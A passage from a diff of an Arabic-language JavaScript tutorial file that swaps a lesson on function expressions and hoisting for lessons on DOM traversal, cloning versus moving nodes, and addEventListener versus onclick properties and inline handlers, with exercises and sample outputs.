+  return n;
+}
+const li2 = document.querySelector("#menu-link").parentElement;
+console.log(cssPath(li2), "|", cssPath(document.querySelector("#steps .now")), "|", cssPath(document.querySelector("#site a")));
+console.log(document.querySelector(cssPath(li2)) === li2, countDescendants(document.querySelector("#site")), document.querySelector("#site").querySelectorAll("*").length);
+</script>
+~~~
+
+~~~text الناتج (Chrome 157)
+nav#site > ul > li:nth-child(2) | ol#steps > li:nth-child(2) | nav#site > ul > li:nth-child(1) > a
+true 5 5
+~~~
+
+- **[[parts.unshift]]:** بنطلع من تحت لفوق، فكل جزء بيتحط في أول اللستة.
+- **[[:nth-child(n)]] بيعدّ كل الإخوات** مش اللي من نفس النوع بس، فالرقم من [[indexOf]] في [[children]] كلها. (لو عايز من نفس النوع: [[:nth-of-type]].)
+- **الوقفة عند [[id]]:** الـ id المفروض فريد، فالـ selector بيبقى أقصر وأثبت.
+- **العدّ:** [[nav]] تحته [[ul]] و ٢ [[li]] و ٢ [[a]] = ٥. الاتنين نفس الرقم، والـ recursion هنا عشان تفهم إزاي [[querySelectorAll("*")]] بيمشي.
+- DevTools بيعمل نفس الحكاية: كليك يمين على عنصر في Elements ثم Copy ثم Copy selector.` },
+            { lvl: 'سريع', t: R`**قارن وقيس:** اعمل [[<p id="card">]] عليه listener بيعدّ الضغطات، وحطه في [[div]] بـ [[append]] مرتين: كام عنصر في الـ div؟ وبعدين [[cloneNode(true)]] وحط النسخة: كام عنصر بـ [[#card]]؟ ادوس على الاتنين: مين اتعدّ؟ (من قسمي ٤ و ٥ في الشرح).`, done: R`[[append]] مرتين = عنصر واحد، والنسخة عملت [[id]] مكرر، والـ listener اشتغل على الأصلي بس.`, sol: R`~~~js clone-vs-move.js (في صفحة)
+const box = document.createElement("div");
+const card = document.createElement("p");
+card.id = "card";
+card.textContent = "كارت";
+let clicks = 0;
+card.addEventListener("click", () => clicks++);
+box.append(card);
+box.append(card);
+console.log("append مرتين:", box.children.length);
+const copy = card.cloneNode(true);
+copy.addEventListener("click", () => (clicks += 10));
+box.append(copy);
+console.log("بعد النسخ:", box.children.length, box.querySelectorAll("#card").length, copy.id);
+card.click();
+copy.click();
+console.log("الضغطات:", clicks);
+const other = document.createElement("section");
+other.append(card);
+console.log("بعد النقل:", box.children.length, other.children.length, card.parentElement.localName);
+~~~
+
+~~~text الناتج (Chrome 157)
+append مرتين: 1
+بعد النسخ: 2 2 card
+الضغطات: 11
+بعد النقل: 1 1 section
+~~~
+
+- **[[append]] لنفس العقدة** نقلها لنفس المكان، فلسه واحدة.
+- **النسخة شايلة نفس الـ id:** بقى فيه اتنين [[#card]]، و [[getElementById]] هيرجّع الأول بس. غيّر [[copy.id]] أو شيله.
+- **11 = 1 + 10:** ضغطة الأصلي عدّت ١ من الـ listener بتاعه، والنسخة عدّت ١٠ من الـ listener اللي حطيناه عليها بعد النسخ. الـ listener الأصلي متنسخش.
+- **النقل لعنصر تاني** شاله من [[box]] تلقائي، من غير [[remove()]].` },
           ],
           ref: [
-            { t: "MDN: AsyncFunction", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncFunction" },
-            { t: "MDN: GeneratorFunction", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/GeneratorFunction" },
-            { t: "MDN: AsyncGeneratorFunction", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncGeneratorFunction" },
-            { t: "MDN: Generator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator" },
-            { t: "MDN: AsyncGenerator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncGenerator" },
-            { t: "MDN: Function() constructor", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function" },
-            { t: "ECMAScript: CreateDynamicFunction", url: "https://tc39.es/ecma262/multipage/fundamental-objects.html#sec-createdynamicfunction" },
+            { t: "MDN: Node", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node" },
+            { t: "MDN: Node.childNodes", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node/childNodes" },
+            { t: "MDN: Element.children", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/children" },
+            { t: "MDN: Node.parentElement", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node/parentElement" },
+            { t: "MDN: Element.firstElementChild", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/firstElementChild" },
+            { t: "MDN: Element.nextElementSibling", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/nextElementSibling" },
+            { t: "MDN: Element.closest()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/closest" },
+            { t: "MDN: Node.contains()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node/contains" },
+            { t: "MDN: Element.append()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/append" },
+            { t: "MDN: Element.replaceWith()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/replaceWith" },
+            { t: "MDN: Element.remove()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/remove" },
+            { t: "MDN: Node.cloneNode()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Node/cloneNode" },
           ],
-          pre: [{ to: "js/Function: length و name و toString و new.target", why: R`[[Function]] كـ object و [[length]] و [[name]] و [[toString]]` }, { to: "js/prototype chain", why: R`[[Object.getPrototypeOf]] والقراية في السلسلة` }, "js/AsyncIterator و async generators: for await بعمق"],
+          pre: ["js/querySelector", "js/textContent و classList", { to: "js/event delegation", why: R`[[closest]] هو اللي بيخلي listener واحد على الأب يعرف الضغطة جات من أنهي ابن` }],
+          deep: {
+            why: R`[[querySelector]] بيدوّر في الصفحة كلها، بس كتير انت عارف مكانك ومحتاج «الأب» أو «اللي جنبي»: زرار مسح جوه كارت، صف جدول، خطوة بعد خطوة. والفرق بين [[childNodes]] و [[children]] هو أصل باجات بتظهر وتختفي مع شكل الـ HTML.`,
+            how: R`كل [[Node]] فيه مؤشرات للأب وأول وآخر ابن والإخوات، والخصايص اللي فيها «Element» بتمشي على نفس المؤشرات وتتخطى اللي مش عنصر. [[append]] و [[before]] وأخواتهم بيشيلوا العقدة من مكانها القديم الأول (لو ليها مكان) وبعدين يحطوها، والنصوص بيعملوا منها [[Text]] node. و [[children]] collection حية بتتحسب كل مرة تقراها.`,
+            when: R`[[closest]] في أي listener على أب. [[contains]] لـ «ضغطة برّه». [[nextElementSibling]] و [[previousElementSibling]] للنقل والتنقل بالكيبورد. [[replaceChildren()]] لما ترسم لستة من الداتا من أول وجديد. [[cloneNode(true)]] مع [[<template>]].`,
+            mistakes: R`[[firstChild]] و [[nextSibling]] وانت قصدك عنصر. اللف على [[children]] وانت بتمسح منها. نسخ عنصر بالـ id. توقّع إن [[cloneNode]] بيجيب الـ listeners. [[appendChild("نص")]] بدل [[append]]. [[parentElement]] على [[<html>]] ومستني الـ document.`,
+          },
         },
         {
-          cmd: "function expression و class expression و expression statement",
-          title: "function و function* و async و class كـ expressions: الاسم والـ hoisting، وليه سطر مينفعش يبدأ بـ function أو {",
-          desc: R`كل نوع دالة ليه شكلين: **declaration** (جملة لوحدها بتبدأ بالكلمة: [[function f() {}]]) و **expression** (قيمة جوه حاجة تانية: [[const f = function () {}]]). وده للأنواع الخمسة: [[function]] و [[function*]] و [[async function]] و [[async function*]] و [[class]].
-
-الفروق اللي بتفرق:
-• **الـ hoisting:** الـ declaration موجودة من أول الـ scope، والـ expression مش موجودة غير لما السطر بتاعها يتنفّذ.
-• **الاسم:** في الـ expression الاسم اختياري، ولو كتبته ([[function fact(n) {}]]) بيبقى ظاهر **جوه** الدالة بس، فينفع recursion آمن.
-• **المكان:** الـ expression تتحط في أي مكان قيمة: argument، أو [[return]]، أو object، أو [[class extends Base]] جوه دالة (mixins).
-
-و **expression statement** = سطر عبارة عن expression لوحده ([[x = 5;]] أو [[save();]]). والقاعدة: السطر ده **مينفعش يبدأ** بـ [[function]] أو [[class]] أو [[{]] أو [[let []]، لأن JavaScript بيقراهم بداية declaration أو block. عشان كده [[{}.toString()]] بيرمي SyntaxError و [[({}).toString()]] شغال.`,
-          example: R`// declaration ولا expression: الفرق في الـ hoisting والاسم والمكان
-console.log(typeof declared, typeof expr);
-function declared() {}
-var expr = function () {};
-const factorial = function fact(n) { return n <= 1 ? 1 : n * fact(n - 1); };
-console.log(factorial(5), factorial.name, typeof fact);
-const ids = function* () { yield 1; yield 2; };
-const load = async function () { return 'loaded'; };
-const pages = async function* () { yield 'p1'; };
-console.log([...ids()], await load(), await Array.fromAsync(pages()), ids.name, pages.name);
-const Point = class { constructor(x) { this.x = x; } };
-const Timestamped = (Base) => class extends Base { stamp = 'T'; };
-console.log(new (Timestamped(Point))(3), Point.name);
-const obj = { a: 1 };
-let a;
-({ a } = obj);
-console.log(a, ({}).toString(), (() => ({ a: 1 }))(), (() => { a: 1 })());`,
-          try: R`اكتب كل سطر من دول في ملف [[.cjs]] لوحده وشغّله، واقرا الرسالة: [[{}.toString()]] و [[function () {}]] و [[function f() { return 1 }()]] و [[class {}]]. وبعدين سطرين: [[const x = 1]] وتحته [[(function () {})()]] من غير [[;]].`,
-          sol: R`~~~text الناتج (Node 24.22، كل سطر في ملف .cjs لوحده)
-{}.toString()                      SyntaxError: Unexpected token '.'
-function () {}                     SyntaxError: Function statements require a function name
-function f() { return 1 }()        SyntaxError: Unexpected token ')'
-class {}                           SyntaxError: Unexpected token '{'
-const x = 1 / (function () {})()   TypeError: 1 is not a function
+          cmd: "event handlers: addEventListener و onclick و onclick=\"\"",
+          title: "٣ طرق تربط بيها كود بحدث: واحدة للشغل، وواحدة تفهمها، وواحدة متستخدمهاش",
+          desc: R`فيه ٣ طرق تقول للمتصفح «لما الزرار يتداس شغّل ده»: [[addEventListener]] (الطريقة الصح، وتقدر تشيله بـ [[removeEventListener]] أو بـ [[signal]])، والـ event handler property [[el.onclick = fn]] (واحد بس لكل حدث، والجديد بيمسح القديم)، والـ inline attribute [[<button onclick="...">]] في الـ HTML (متستخدمهاش: الـ CSP بيمنعها، وبتشتغل في الـ global scope، وبتخلط الـ HTML بالكود).
+• [[addEventListener(type, fn, { once, signal, capture, passive })]] و [[removeEventListener(type, sameFn)]] بنفس الـ function بالظبط.
+• [[el.onclick = fn]] و [[el.onclick = null]].
+• [[onclick="..."]]: جواها [[this]] و [[event]]، وبتشوف حقول الفورم بالاسم.`,
+          example: R`const buy = document.querySelector("#buy");
+buy.onclick = () => console.log("onclick 1");
+buy.onclick = () => console.log("onclick 2");
+function hello() { console.log("listener"); }
+buy.addEventListener("click", hello);
+buy.addEventListener("click", hello);
+buy.addEventListener("click", () => console.log("مرة واحدة"), { once: true });
+buy.click();
+buy.removeEventListener("click", hello);
+buy.onclick = null;
+buy.click();`,
+          try: R`في صفحة عندك فيها زرار، شغّل المثال في الـ Console. كام سطر طبع أول [[click()]]؟ وكام سطر تاني [[click()]]؟ وبعدين جرّب [[buy.removeEventListener("click", () => console.log("مرة واحدة"))]] قبل أول ضغطة: الـ listener اتشال؟`,
+          sol: R`~~~text الناتج (Chrome 157)
+onclick 2
+listener
+مرة واحدة
 ~~~
 
-- [[{}.toString()]]: الـ [[{]] في أول جملة = **block** فاضي، وبعده [[.toString()]] ملهاش معنى. بالأقواس [[({}).toString()]] بقت expression: object literal.
-- [[function () {}]] في أول جملة = declaration، والـ declaration لازم اسم.
-- [[function f() { return 1 }()]]: الـ declaration خلصت عند [[}]]، و [[()]] بعدها أقواس فاضية مش نداء. الـ IIFE لازم تبقى expression: [[(function f() { return 1 })()]].
-- [[class {}]]: نفس الكلام، الـ class declaration محتاجة اسم.
-- **آخر واحدة مش SyntaxError**: من غير [[;]] السطرين اتقروا [[const x = 1(function () {})()]]: نداء للرقم 1. ده سبب «حط [[;]] قبل أي سطر بيبدأ بـ [[(]] أو [[[]] أو backtick» لو انت من غير semicolons.
+أول ضغطة: ٣ سطور. التانية: ولا سطر (الـ [[once]] اتشال لوحده بعد أول مرة، و [[hello]] اتشال بـ [[removeEventListener]]، و [[onclick]] بقى [[null]]).
 
-**ملاحظة:** لو جرّبتهم بـ [[node -e]] بدل ملف، Node 24.22 بيحاول يقراهم TypeScript الأول وبيطبع سطر من الـ parser بتاعه ([[Expression expected]] أو [[Expected ident]]) فوق الـ SyntaxError الحقيقي. الملف بيدّيك رسالة V8 لوحدها.`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** ٤ نداءات **قبل** التعريفات. اكتب نتيجة كل واحد (القيمة أو اسم الخطأ):
+و [[removeEventListener]] بـ arrow جديدة **مبتشيلش حاجة**: كل [[() => ...]] function جديدة، حتى لو الكود نفس الحروف، والمتصفح بيقارن الـ reference مش النص.`,
+          teach: R`## الفكرة
+
+نفس الضغطة، ٣ طرق تربطها:
+
+~~~html الطرق التلاتة
+<button id="a" onclick="console.log('inline')">inline attribute</button>
+<script>
+  document.querySelector("#b").onclick = () => console.log("property");
+  document.querySelector("#c").addEventListener("click", () => console.log("listener"));
+</script>
+~~~
+
+| | [[addEventListener]] | [[el.onclick = fn]] | [[onclick="..."]] |
+|---|---|---|---|
+| كام واحد على نفس الحدث | أي عدد | واحد بس | واحد بس |
+| تشيله | [[removeEventListener]] أو [[signal]] | [[= null]] | تمسح الـ attribute |
+| options ([[once]] و [[capture]] و [[passive]]) | آه | لأ | لأ |
+| مع CSP من غير [[unsafe-inline]] | شغال | شغال | **ممنوع** |
+| الكود فين | ملف JS | ملف JS | جوه الـ HTML كنص |
+
+كل النواتج من Chrome 157 على صفحة من سيرفر محلي.
+
+---
+
+## ١. [[addEventListener]] و [[removeEventListener]]
+
+~~~text الناتج: أول [[buy.click()]] في المثال
+onclick 2
+listener
+مرة واحدة
+~~~
+
+**[[addEventListener("click", hello)]] مرتين = مرة واحدة.** المتصفح بيخزّن الـ listeners بالتلاتة (النوع، والـ function، و [[capture]])، ولو نفس التلاتة موجودين بيتجاهل التاني. عشان كده «listener» اتطبع مرة.
+
+**[[removeEventListener]] محتاج نفس الـ function بالظبط** (نفس الـ reference، ونفس [[capture]]). الغلطات المشهورة:
 
 ~~~js
-const tryIt = (label, fn) => { try { console.log(label, fn()); } catch (e) { console.log(label, e.constructor.name + ': ' + e.message); } };
-tryIt('A', () => a());
-tryIt('B', () => b());
-tryIt('C', () => c());
-tryIt('D', () => new D());
-function a() { return 'a ok'; }
-var b = function () { return 'b ok'; };
-let c = function () { return 'c ok'; };
-const D = class {};
-~~~`, done: R`كتبت الـ ٤ صح، وتقدر تفرّق بين [[TypeError]] بتاع B و [[ReferenceError]] بتاع C و D.`, sol: R`~~~text الناتج (Node 24.22)
-A a ok
-B TypeError: b is not a function
-C ReferenceError: Cannot access 'c' before initialization
-D ReferenceError: Cannot access 'D' before initialization
+btn.addEventListener("click", () => save());
+btn.removeEventListener("click", () => save());      // arrow جديدة: مبتشيلش
+btn.addEventListener("click", this.save.bind(this));
+btn.removeEventListener("click", this.save.bind(this)); // bind بيرجّع function جديدة كل مرة
 ~~~
 
-| التعريف | قبل سطره |
+اتقاس في تمرين ٢: [[s.onClick.bind(s) === s.onClick.bind(s)]] = [[false]]، والعدّاد كمّل يعدّ بعد [[stop()]]. الحل: خزّن الـ function في متغيّر أو field، أو استخدم [[signal]].
+
+**الـ options:**
+
+| الـ option | بيعمل إيه |
 |---|---|
-| [[function a() {}]] (declaration) | الدالة كاملة موجودة من أول الملف |
-| [[var b = function () {}]] (expression في [[var]]) | [[b]] موجود بقيمة [[undefined]]، فالنداء [[TypeError]] |
-| [[let c = function () {}]] | [[c]] في الـ TDZ، فأي لمس [[ReferenceError]] |
-| [[const D = class {}]] (class expression) | نفس الـ TDZ |
+| [[{ once: true }]] | يتشال لوحده بعد أول مرة («مرة واحدة» اتطبعت مرة) |
+| [[{ signal }]] | من [[AbortController]]: [[controller.abort()]] بتشيل كل الـ listeners اللي ليها نفس الـ signal مرة واحدة (تمرين ٤) |
+| [[{ capture: true }]] | يشتغل وهو نازل من [[window]] للعنصر قبل الـ bubbling (درس «event delegation») |
+| [[{ passive: true }]] | وعد إنك مش هتعمل [[preventDefault()]]، فالمتصفح يعمل scroll من غير ما يستناك |
 
-الـ expression نفسها (الدالة أو الـ class) مبتتعملش غير لما السطر يتنفّذ، والمتغير اللي شايلها بيمشي بقواعد [[var]] أو [[let]] (درس «hoisting و TDZ»). وحتى [[class D {}]] كـ declaration ليها TDZ زي [[let]]، عكس [[function]].` },
-            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** ملف من غير semicolons بيقع. اقرا الرسالة، وقول ليه بتقول [[qty]] بالذات:
-
-~~~js
-const price = 120
-const qty = 2
-const total = price * qty
-(['SAVE10'] || []).forEach((code) => console.log('كوبون', code))
-console.log(total)
-~~~`, done: R`النسخة المصلّحة بتطبع [[كوبون SAVE10]] و [[240]]، وتقدر تشرح إزاي السطرين اتقروا سطر واحد.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-TypeError: qty is not a function
-~~~
-
-السطر التالت مفيهوش [[;]]، والرابع بيبدأ بـ [[(]]، فالـ ASI (automatic semicolon insertion) **محطش** [[;]] بينهم لأن الكلام لسه «ينفع يكمّل»: [[price * qty(['SAVE10'] || [])...]]. يعني نداء لـ [[qty]] كأنه دالة.
-
-~~~js coupon.cjs
-const price = 120;
-const qty = 2;
-const total = price * qty;
-(['SAVE10'] || []).forEach((code) => console.log('كوبون', code));
-console.log(total);
-~~~
-
-~~~text الناتج (Node 24.22)
-كوبون SAVE10
-240
-~~~
-
-القاعدة لو بتكتب من غير semicolons (أسلوب StandardJS مثلًا): أي سطر بيبدأ بـ [[(]] أو [[[]] أو backtick أو [[+]] أو [[-]] أو [[/]] حط قبله [[;]] ([[;(['SAVE10'] || [])...]]). و Prettier بيحطها لوحده.` },
-            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** فيه **empty statement** مستخبي في كل جزء. لاقيه:
-
-~~~js
-const items = [1, 2, 3];
-let found = null;
-for (let i = 0; i < items.length; i++);
-{
-  found = 'loop body ran once';
-}
-console.log(found);
-let total = 0;
-for (const x of items) if (x > 1); total += x;
-~~~`, done: R`عرفت الـ [[;]] الزيادة في الاتنين، والنسخة المصلّحة بتجمع [[5]] (2 + 3)، وتقدر تقول إمتى الـ empty statement مقصودة.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-loop body ran once
-for (const x of items) if (x > 1); total += x;
-ReferenceError: x is not defined
-~~~
-
-- [[for (...);]]: الـ [[;]] لوحدها **empty statement** هي جسم الـ loop. الـ loop لفت ٣ مرات وماعملتش حاجة، والـ [[{ ... }]] اللي تحتها **block** عادي اتنفّذ مرة واحدة.
-- [[if (x > 1);]]: نفس الكلام: جسم الـ [[if]] فاضي، و [[total += x]] جملة **برّه** الـ loop خالص، فـ [[x]] مش موجود هناك.
-
-~~~js fixed.cjs
-const items = [1, 2, 3];
-let total = 0;
-for (const x of items) if (x > 1) total += x;
-console.log(total);
-~~~
-
-~~~text الناتج (Node 24.22)
-5
-~~~
-
-**إمتى الـ [[;]] الفاضية مقصودة:** لما الشغل كله في رأس الـ loop: [[while (k++ < 3);]] (وبعدها [[k]] بـ 4) أو [[for (let i = 0; i < 3; arr.push(i++));]] (بيعمل [[[ 0, 1, 2 ]]])، اتجرّبوا. ولو كتبتها، اكتبها في سطر لوحدها بتعليق، و ESLint عنده [[no-empty]] و [[no-extra-semi]] بيمسكوا الغلط ده.` },
-            { lvl: 'تحدي', t: R`**ابني:** mixins بـ class expressions: [[Timestamped(Base)]] بيزوّد [[createdAt]]، و [[Serializable(Base)]] بيزوّد [[toJSON()]] بترجّع [[{ type: this.constructor.name, ...this }]]. ركّبهم على [[Product]]. لازم [[type]] في الـ JSON يبقى اسم الـ class النهائية.`, done: R`[[JSON.stringify(new Item('tea', 45))]] فيه [[type: "Item"]] و [[createdAt]]، و [[tea instanceof Product]] بـ [[true]]، و [[class Ticket extends Serializable(Object)]] بيطلّع [[{"type":"Ticket","id":7}]].`, sol: R`أول نسخة كتبت [[const Item = Serializable(Timestamped(Product))]]، والناتج كان:
-
-~~~text الناتج من النسخة الأولى (Node 24.22)
-{"type":"Serializable","name":"tea","price":45,"createdAt":"2026-11-21"} true Serializable
-~~~
-
-[[Item]] مجرد متغير شايل الـ class اللي رجعت من [[Serializable]]، والـ class دي **named class expression** اسمها [[Serializable]]، فـ [[this.constructor.name]] قال كده. والـ class اللي من [[Timestamped]] من غير اسم خالص ([[name]] فاضي) لأنها اترجعت من دالة مش اتحطت في متغير.
-
-~~~js mixins.mjs
-const Timestamped = (Base) => class extends Base {
-  createdAt = '2026-11-21';
-};
-const Serializable = (Base) => class Serializable extends Base {
-  toJSON() { return { type: this.constructor.name, ...this }; }
-};
-class Product { constructor(name, price) { this.name = name; this.price = price; } }
-class Item extends Serializable(Timestamped(Product)) {}
-const tea = new Item('tea', 45);
-console.log(JSON.stringify(tea));
-console.log(tea instanceof Product, Item.name, Object.getPrototypeOf(Item).name, JSON.stringify(Object.getPrototypeOf(Object.getPrototypeOf(Item)).name));
-class Ticket extends Serializable(Object) { id = 7; }
-console.log(JSON.stringify(new Ticket()));
-~~~
-
-~~~text الناتج (Node 24.22)
-{"type":"Item","name":"tea","price":45,"createdAt":"2026-11-21"}
-true Item Serializable ""
-{"type":"Ticket","id":7}
-~~~
-
-**الشرح:** [[class extends]] بيقبل **أي expression** بعد [[extends]]، فـ [[Serializable(Timestamped(Product))]] نداء بيرجّع class، واتعملت declaration باسم [[Item]] فوقيها. السلسلة: [[Item]] ← [[Serializable]] ← (من غير اسم) ← [[Product]]. والـ [[...this]] في [[toJSON]] بياخد الخصايص الـ own (والـ class fields زي [[createdAt]] و [[id]] own). سمّي الـ class expressions اللي جوه mixins (زي [[class Serializable]]) عشان الـ stack traces تبقى مقروءة، وخلّي آخر class declaration باسم حقيقي.` },
-            { lvl: 'تحدي', t: R`**قارن:** دالة recursion متخزنة في [[let countdown]]، واتعمل لها نسخة [[saved]] وبعدين [[countdown = null]]. جرّبها مرة كـ anonymous function expression بتنادي [[countdown]]، ومرة كـ named function expression [[function self(n)]] بتنادي [[self]].`, done: R`الأولى بتقع بـ [[TypeError]] والتانية بترجّع [[[ 3, 2, 1, 'go' ]]]، وتقدر تشرح ليه [[self]] مبيتأثرش.`, sol: R`~~~js nfe.mjs
-let countdown = function (n) { return n <= 0 ? ['go'] : [n, ...countdown(n - 1)]; };
-const saved = countdown;
-countdown = null;
-try { console.log(saved(3)); } catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-let countdown2 = function self(n) { return n <= 0 ? ['go'] : [n, ...self(n - 1)]; };
-const saved2 = countdown2;
-countdown2 = null;
-console.log(saved2(3), saved2.name);
-~~~
-
-~~~text الناتج (Node 24.22)
-TypeError: countdown is not a function or its return value is not iterable
-[ 3, 2, 1, 'go' ] self
-~~~
-
-**الشرح:** الأولى بتدوّر على [[countdown]] في الـ scope اللي برّه **وقت النداء**، ولقته [[null]]. التانية: اسم الـ named function expression ([[self]]) بيتعمل في scope صغير **خاص بالدالة** ومربوط بيها للأبد، ومش ظاهر برّه ([[typeof self]] برّه بـ [[undefined]])، وكمان مينفعش يتغيّر: [[self = 5]] جواها بيتجاهل في sloppy mode وبيرمي [[TypeError: Assignment to constant variable.]] في strict (اتجرّب). والـ [[name]] بقى [[self]] مش [[countdown2]]، فالـ stack trace هيقول [[self]].` },
-          ],
-          flag: "script",
-          deep: {
-            why: R`الفرق بين declaration و expression بيفسّر نص الأخطاء الغريبة: [[is not a function]] قبل التعريف، و [[Cannot access before initialization]]، و [[{}.toString()]] بيقع، و [[() => { a: 1 }]] بترجّع [[undefined]]، وسطرين من غير [[;]] بقوا سطر واحد. وكمان بيفتح أنماط مهمة: callbacks و IIFE و mixins و factories بترجّع classes، و recursion آمن.`,
-            how: R`الـ parser لما يبدأ **جملة** بيبص على أول token: [[function]] أو [[async function]] = FunctionDeclaration (أو generator)، و [[class]] = ClassDeclaration، و [[{]] = Block، و [[let []] = lexical declaration. فالمواصفة بتقول ExpressionStatement «lookahead ∉ { [[{]]، [[function]]، [[async function]]، [[class]]، [[let []] }». أي حاجة تانية بتبدأ expression، والأقواس [[( )]] (grouping) أسهل طريقة تقلب الـ parser لـ «expression».
-
-الـ declarations بتتسجّل قبل التنفيذ (hoisting): [[function]] بقيمتها، و [[class]] من غير قيمة (TDZ). الـ expressions بتتقيّم لما السطر يتنفّذ. و named function expression بتعمل environment صغير فيه اسمها بس، مربوط بالدالة و immutable، فالاسم ظاهر في الجسم بس. ولو الـ expression من غير اسم واتحطت مباشرة في متغير أو property، بتاخد اسم المتغير ([[ids.name]] بـ [[ids]])، وده اسمه NamedEvaluation، لكن لو اترجعت من دالة ([[return class extends Base {}]]) بتفضل من غير اسم.`,
-            when: R`declaration: للدوال والـ classes الأساسية في الملف (مقروءة وبتتنادى من أي مكان). function expression أو arrow: callbacks، وقيم في objects، ودوال اتعملت حسب شرط. named function expression: recursion جوه expression، و stack traces أوضح لـ callbacks. class expression: mixins و factories ([[(Base) => class extends Base {}]]) و classes مؤقتة في الاختبارات. [[async function]] expression: [[(async function () { ... })()]] لما محتاج [[await]] في ملف CommonJS. و [[function*]] و [[async function*]] expressions: generators كقيم ([[{ [Symbol.iterator]: function* () {} }]] أو argument).`,
-            mistakes: R`- تنادي function expression قبل سطرها: [[TypeError: b is not a function]] ([[var]]) أو [[ReferenceError]] ([[let]] و [[const]]).
-- تفتكر اسم الـ named function expression ظاهر برّه: [[typeof fact]] بـ [[undefined]].
-- [[() => { a: 1 }]] ومستني object: الـ [[{]] block و [[a:]] label، فبترجّع [[undefined]]. اكتب [[() => ({ a: 1 })]].
-- [[{ a } = obj;]] في أول سطر: block. اكتب [[({ a } = obj);]].
-- IIFE من غير أقواس، أو سطر قبلها من غير [[;]]: [[TypeError: 1 is not a function]].
-- [[;]] بعد [[for (...)]] أو [[if (...)]]: الـ body بقى empty statement.
-- [[class {}]] كجملة: [[SyntaxError: Unexpected token '{']]. الـ class declaration لازم اسم.
-- في الـ REPL أو [[eval]]: [[eval('{}')]] بـ [[undefined]] (block) و [[eval('({})')]] بـ [[{}]]، و [[eval('{} + []')]] بـ [[0]] (block وبعده [[ +[] ]]) و [[eval('({} + [])')]] بـ [[[object Object]]] (اتجرّبوا).`,
-          },
-          teach: R`## الفكرة في سطر
-
-نفس الدالة أو الـ class ممكن تتكتب **جملة** لوحدها (declaration) أو **قيمة** جوه حاجة (expression)، والفرق بيبان في الـ hoisting والاسم والأماكن اللي تقدر تحطها فيها. الناتج من Node 24.22 (ملف [[.mjs]]).
+**[[this]] جوه الـ listener:** في [[function]] عادية [[this]] = العنصر ([[e.currentTarget]])، وفي arrow [[this]] من برّه (اتقاس: [[this: buy]] و [[arrow this: true]] يعني [[window]]). الأوضح دايمًا: [[e.currentTarget]].
 
 ---
 
-## ١. function expression والـ hoisting
+## ٢. الـ event handler property: [[el.onclick = fn]]
 
-~~~js
-console.log(typeof declared, typeof expr);
-function declared() {}
-var expr = function () {};
+~~~text الناتج: [[onclick]] اتعيّن مرتين
+onclick 2
+~~~
+
+خاصية عادية على العنصر: قيمة واحدة. التاني مسح الأول، و [[= null]] بيشيله ([[typeof buy.onclick]] بقى [["object"]] لأن [[null]]). كل حدث ليه property: [[onclick]] و [[oninput]] و [[onsubmit]] و [[onload]] و [[onerror]] و [[onkeydown]]...
+
+**إمتى تقبلها:** object انت عامله وعارف إن مفيش حد غيرك هيسمع، زي [[img.onload]] و [[xhr.onload]] و [[reader.onload]] (الدرس الجاي) و [[anim.onfinish]]. **إمتى لأ:** أي عنصر في الصفحة ممكن كود تاني (مكتبة، إضافة، زميلك) يسمع عليه: [[onclick =]] بتاعه هيمسح بتاعك من غير أي error.
+
+**حاجتين غريبين اتقاسوا:**
+
+- **[[buy.onclick = "console.log('x')"]]** (نص مش function) بيتجاهل: القيمة بقت [[null]].
+- **المكان في الترتيب:** الـ handler property بياخد مكانه في لستة الـ listeners أول مرة تعيّنه، والتعيين التاني بيبدّل الكود في نفس المكان. لكن بعد [[= null]] والتعيين من جديد بيروح لآخر اللستة. عشان كده المثال طبع «onclick 2» قبل «listener» مع إنه اتعيّن قبله وبعده.
+
+---
+
+## ٣. الـ inline attribute: [[onclick="..."]] وليه لأ
+
+الكود مكتوب كنص جوه الـ HTML، والمتصفح بيحوّله لـ function وقت ما يحتاجها:
+
+~~~html
+<form><input name="q" value="قهوة"><button type="button" onclick="console.log('inline:', this.id, event.type, q.value)" id="b">اطلب</button></form>
 ~~~
 
 ~~~text الناتج
-function undefined
+inline: b click قهوة
 ~~~
 
-- [[function declared() {}]]: declaration، اتسجّلت بقيمتها قبل أي سطر، فـ [[typeof]] قال [[function]] قبل سطرها.
-- [[var expr = function () {};]]: الـ **function expression** هي الحتة اللي على يمين [[=]]. المتغير [[expr]] اتسجّل (عشان [[var]]) بقيمة [[undefined]]، والدالة نفسها مش هتتعمل غير لما السطر يتنفّذ.
+جواها [[this]] = العنصر، و [[event]] = الحدث، و [[q]] = حقل الفورم اسمه q! الـ function دي بتشوف خصايص العنصر نفسه والفورم والـ document كأنها متغيّرات (scope غريب)، فأي اسم تكتبه ممكن يتصادم مع حاجة متعرفهاش.
+
+**ليه متستخدمهاش، بالترتيب:**
+
+**١. الـ CSP بيمنعها.** أي موقع جاد بيبعت [[Content-Security-Policy]] عشان يقلل الـ XSS (درس «Content Security Policy» في تاب الـ web). نفس الصفحة بالـ header ده [[script-src 'self']]: الـ property والـ listener اشتغلوا، والـ inline اتمنع:
+
+~~~text الـ Console (Chrome 157، ضغطة على زرار الـ inline)
